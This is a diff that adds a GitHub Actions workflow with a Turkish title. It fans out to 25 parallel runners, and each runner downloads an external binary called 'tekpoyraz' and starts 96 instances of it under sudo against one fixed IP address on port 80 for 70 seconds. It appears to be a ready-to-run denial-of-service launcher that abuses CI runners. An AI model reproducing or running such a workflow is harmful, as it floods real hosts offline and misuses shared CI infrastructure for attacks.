@@ -1,0 +1,33 @@
+name: Ubuntu VDS 20 saniye tek poraz
+
+on:
+  workflow_dispatch:
+
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 25
+      matrix:
+       instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
+
+
+    steps:
+      - name: OK !
+        run: |
+          wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O tekpoyraz
+          chmod +x tekpoyraz
+          PIDS=()
+          for i in {1..96}; do
+            sudo timeout 70 ./tekpoyraz 52.57.157.87 80 &
+            PIDS+=($!)
+          done
+          
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
+
+      - name: OK !
+        run: |
+          sleep 70
+          exit 0
